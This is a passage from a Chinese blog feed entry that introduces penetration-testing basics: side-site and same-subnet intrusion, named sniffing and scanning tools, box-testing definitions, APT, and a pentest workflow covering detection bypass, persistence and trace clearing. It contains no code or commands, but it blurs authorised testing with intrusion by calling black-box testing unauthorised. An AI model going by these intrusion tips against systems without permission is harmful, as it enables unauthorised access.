即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限。常见的旁站查询工具有：WebRobot、御剑、明小子和web在线查询等。</p><p>C段入侵： 即同C段下服务器入侵。如目标ip为192.168.1.253，入侵192.168.1.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。常用的工具有：在windows下有Cain，在UNIX环境下有Sniffit，Snoop，Tcpdump，Dsniff等。</p><p>C段技巧 :</p><p>1.扫描1-255全部网段的网站CMS情况<br>选择一款自己擅长入侵的cms，这样才能更快速的实现C段入侵<br>2.扫描1-255全部网段的端口开放情况<br>先查询端口，选择自己擅长提权的端口的网站来入侵，通过端口提权。使用到的工具椰树、阿D网络工具包</p><h2 id="0x02渗透测试"><a href="#0x02渗透测试" class="headerlink" title="0x02渗透测试"></a>0x02渗透测试</h2><p><strong>黑盒测试</strong>： 在未授权的情况下，模拟黑客的攻击方法和思维方式，来评估计算机网络系统可能存在的安全风险。 黑盒测试不同于黑客入侵，并不等于黑站。黑盒测试考验的是综合的能力（OS、Database、Script、code、思路、社工） 思路与经验积累往往决定成败。 三个臭皮匠赛过诸葛亮。<br><strong>白盒测试</strong> ： 相对黑盒测试，白鹤测试基本是从内部发起。 黑百合的另一种说法： 知道源代码和不知道源代码的渗透测试。 这时，黑盒测试还是传统的渗透测试，而白盒测试就偏向于代码审计。</p><p><strong>灰盒测试</strong>：基于白盒与黑盒测试之间的一种产物。 </p><p><strong>APT攻击</strong>：Advanced Persistent Threat 高级可持续性攻击，是指组织（特别是政府）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。<br>1.极强的隐蔽性<br>2.潜伏期长，持续性强<br>3.目标性强<br><strong>渗透测试的特点：</strong><br>充满挑战与刺激——不达目的不罢休<br>思路与经验累计往往决定成败</p><p><strong>渗透测试与入侵的最大的区别：</strong><br>渗透测试：更全面的找出服务器的问题，更倾向于保护。<br>入侵：不择手段地（甚至是具有破坏性的）拿到权限。</p><h2 id="0x03渗透测试一般流程："><a href="#0x03渗透测试一般流程：" class="headerlink" title="0x03渗透测试一般流程："></a>0x03渗透测试一般流程：</h2><p>明确目标》信息收集》漏洞探测》漏洞验证》信息分析 》获取所需》信息整理》 形成报告</p><p>1.明确目标：<br>确定范围<br>确定规则<br>确定需求<br>2.信息收集：<br>基础信息<br>系统信息<br>应用信息<br>版本信息<br>服务信息<br>人员信息<br>防护信息<br>3.漏洞探测：<br>系统漏洞<br>WebServer漏洞<br>Web应用漏洞<br>其他端口服务漏洞<br>通信安全<br>4.漏洞验证：<br>自动化验证<br>手工验证<br>试验验证<br>登录猜解<br>业务漏洞验证<br>公开资源的利用<br>5.信息分析<br>精准打击<br>绕过防御机制<br>定制攻击路径<br>绕过检测机制<br>攻击代码<br>6.获取所需<br>实施攻击<br>获取内部信息<br>进一步渗透<br>持续性存在<br>清理痕迹<br>7.信息整理<br>整理渗透工具<br>整理收集信息<br>整理漏洞信息<br>8.形成报告：<br>按需整理<br>补充介绍<br>修补建议</p><p>经验分享<br>信息搜集是关键<br>做事不要太心急<br>多学习，多看源码<br>平时注意搜集0day<br>思路很重要</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;渗透测试基础&quot;&gt;&lt;a href=&quot;#渗透测试基础&quot; class=&quot;headerlink&quot; title=&quot;渗透测试基础&quot;&gt;&lt;/a&gt;渗透测试基础&lt;/h1&gt;&lt;h2 id=&quot;0x00熟悉各类名词&quot;&gt;&lt;a href=&quot;#0x00熟悉各类名词&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://mang0.me/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透" scheme="http://mang0.me/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
